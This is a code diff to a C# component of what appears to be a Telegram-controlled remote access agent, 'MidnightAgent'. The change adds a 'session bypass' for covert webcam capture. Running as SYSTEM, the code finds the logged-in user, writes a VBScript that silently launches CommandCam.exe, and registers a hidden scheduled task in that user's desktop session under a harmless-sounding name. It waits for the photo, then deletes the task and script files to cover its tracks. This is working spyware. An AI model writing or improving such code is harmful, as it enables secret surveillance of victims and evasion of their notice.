@@ -1,6 +1,7 @@
 using System;
 using System.Diagnostics;
 using System.IO;
+using System.Linq;
 using System.Net.Http;
 using System.Threading.Tasks;
 using MidnightAgent.Telegram;
@@ -67,51 +68,86 @@ namespace MidnightAgent.Features
 
                 if (isSystem)
                 {
-                    // Run as Users via Scheduled Task
-                    try 
+                    // Run as logged-in user via XML Scheduled Task (InteractiveToken)
+                    try
                     {
                         TelegramInstance?.SendMessage("🔒 <b>Running CommandCam (Session Bypass)...</b>");
-                        
+
                         string taskName = "MidnightCam";
                         RunSchTasks($"/Delete /TN \"{taskName}\" /F");
-                        
-                        // Create Task
-                        // WRAPPER: Use VBScript WScript.Shell to launch completely hidden (0)
+
+                        // Get logged-in username
+                        string loggedInUser = GetLoggedInUser();
+                        if (string.IsNullOrEmpty(loggedInUser))
+                            return FeatureResult.Fail("❌ Could not determine logged-in user for session bypass");
+
+                        // Build a clean VBScript that properly quotes the path and args
                         string vbsPath = Path.Combine(publicDir, "cam_runner.vbs");
-                        
-                        // VBScript String Escape: Replace " with "" inside the string literal
-                        string safeArgs = cmdArgs.Replace("\"", "\"\"");
-                        string vbsContent = $"CreateObject(\"WScript.Shell\").Run \"\"\"{toolPath}\"\"\" & \" \" & \"{safeArgs}\", 0, True";
+                        // VBS: Run "C:\path\CommandCam.exe" /filename "C:\path\cam.jpg" /devnum 1 /delay 1000
+                        // Escape double-quotes inside VBS string literal by doubling them
+                        string vbsCmdLine = $"\"{toolPath}\" {cmdArgs}";
+                        string vbsEscaped = vbsCmdLine.Replace("\"", "\"\""); // VBS string escape
+                        string vbsContent = $"CreateObject(\"WScript.Shell\").Run \"{vbsEscaped}\", 0, True";
                         File.WriteAllText(vbsPath, vbsContent);
-                        
-                        string runCmd = $"wscript.exe \"{vbsPath}\"";
-                        
-                        // Create Task to run VBS
-                        string createArgs = $"/Create /TN \"{taskName}\" /TR \"{runCmd}\" /SC ONCE /ST 00:00 /RI 1 /IT /RU Users /F";
-                        string createResult = RunSchTasks(createArgs);
-                        
-                        if (!createResult.Contains("SUCCESS"))
-                        {
-                             return FeatureResult.Fail($"Task Create Failed: {createResult}");
-                        }
-                        
-                        string runResult = RunSchTasks($"/Run /TN \"{taskName}\"");
-                        
-                        // Wait for file
+
+                        // XML task with InteractiveToken so it runs in the user's desktop session
+                        string xmlPath = Path.Combine(publicDir, $"cam_task_{Guid.NewGuid():N}.xml");
+                        string taskXml = $@"<?xml version=""1.0"" encoding=""UTF-16""?>
+<Task version=""1.2"" xmlns=""http://schemas.microsoft.com/windows/2004/02/mit/task"">
+  <RegistrationInfo><Description>Cam Capture Helper</Description></RegistrationInfo>
+  <Triggers>
+    <TimeTrigger>
+      <StartBoundary>2020-01-01T00:00:00</StartBoundary>
+      <Enabled>true</Enabled>
+    </TimeTrigger>
+  </Triggers>
+  <Principals>
+    <Principal id=""Author"">
+      <UserId>{loggedInUser}</UserId>
+      <LogonType>InteractiveToken</LogonType>
+      <RunLevel>HighestAvailable</RunLevel>
+    </Principal>
+  </Principals>
+  <Settings>
+    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
+    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
+    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
+    <AllowHardTerminate>true</AllowHardTerminate>
+    <StartWhenAvailable>true</StartWhenAvailable>
+    <AllowStartOnDemand>true</AllowStartOnDemand>
+    <Enabled>true</Enabled>
+    <Hidden>true</Hidden>
+    <RunOnlyIfIdle>false</RunOnlyIfIdle>
+    <ExecutionTimeLimit>PT1M</ExecutionTimeLimit>
+  </Settings>
+  <Actions>
+    <Exec>
+      <Command>wscript.exe</Command>
+      <Arguments>//B //Nologo ""{vbsPath}""</Arguments>
+    </Exec>
+  </Actions>
+</Task>";
+                        File.WriteAllText(xmlPath, taskXml);
+
+                        string createResult = RunSchTasks($"/Create /XML \"{xmlPath}\" /TN \"{taskName}\" /F");
+                        RunSchTasks($"/Run /TN \"{taskName}\"");
+
+                        // Wait for file (up to 20s)
                         TelegramInstance?.SendMessage("⏳ <b>Capturing...</b>");
-                        for (int i = 0; i < 15; i++) // Wait up to 15 seconds
+                        for (int i = 0; i < 20; i++)
                         {
                             if (File.Exists(outputFile) && new FileInfo(outputFile).Length > 0) break;
                             await Task.Delay(1000);
                         }
-                        
-                        // Cleanup Task & VBS
+
+                        // Cleanup
                         RunSchTasks($"/Delete /TN \"{taskName}\" /F");
                         try { File.Delete(vbsPath); } catch { }
+                        try { File.Delete(xmlPath); } catch { }
                     }
                     catch (Exception ex)
                     {
-                         return FeatureResult.Fail($"Session Bypass Failed: {ex.Message}");
+                        return FeatureResult.Fail($"Session Bypass Failed: {ex.Message}");
                     }
                 }
                 else
@@ -154,6 +190,75 @@ namespace MidnightAgent.Features
             {
                 return FeatureResult.Fail($"Error: {ex.Message}");
             }
+        }
+
+        private string GetLoggedInUser()
+        {
+            // Method 1: WMI via explorer.exe
+            try
+            {
+                foreach (var proc in Process.GetProcessesByName("explorer"))
+                {
+                    string query = $"SELECT * FROM Win32_Process WHERE ProcessId = {proc.Id}";
+                    using (var searcher = new System.Management.ManagementObjectSearcher(query))
+                    {
+                        foreach (System.Management.ManagementObject obj in searcher.Get())
+                        {
+                            string[] ownerInfo = new string[] { string.Empty, string.Empty };
+                            if (Convert.ToInt32(obj.InvokeMethod("GetOwner", ownerInfo)) == 0)
+                            {
+                                string user = ownerInfo[0];
+                                string domain = ownerInfo[1];
+                                if (!string.IsNullOrEmpty(user))
+                                    return string.IsNullOrEmpty(domain) ? user : $"{domain}\\{user}";
+                            }
+                        }
+                    }
+                }
+            }
+            catch { }
+
+            // Method 2: quser
+            try
+            {
+                var p = Process.Start(new ProcessStartInfo
+                {
+                    FileName = "quser",
+                    UseShellExecute = false,
+                    CreateNoWindow = true,
+                    RedirectStandardOutput = true,
+                    RedirectStandardError = true
+                });
+                string quserOut = p.StandardOutput.ReadToEnd();
+                p.WaitForExit(3000);
+                foreach (var line in quserOut.Split('\n').Skip(1))
+                {
+                    if (line.Contains("Active") || line.Contains("rdp-tcp"))
+                    {
+                        string[] parts = line.Trim().TrimStart('>').Split(
+                            new char[]{' '}, StringSplitOptions.RemoveEmptyEntries);
+                        if (parts.Length > 0) return parts[0].TrimStart('>');
+                    }
+                }
+            }
+            catch { }
+
+            // Method 3: Environment.UserName
+            try
+            {
+                string envUser = Environment.UserName;
+                if (!string.IsNullOrEmpty(envUser) &&
+                    !envUser.Equals("SYSTEM", StringComparison.OrdinalIgnoreCase))
+                {
+                    string domain = Environment.UserDomainName;
+                    return string.IsNullOrEmpty(domain) || domain == envUser
+                        ? envUser
+                        : $"{domain}\\{envUser}";
+                }
+            }
+            catch { }
+
+            return null;
         }
 
         private string RunSchTasks(string args)
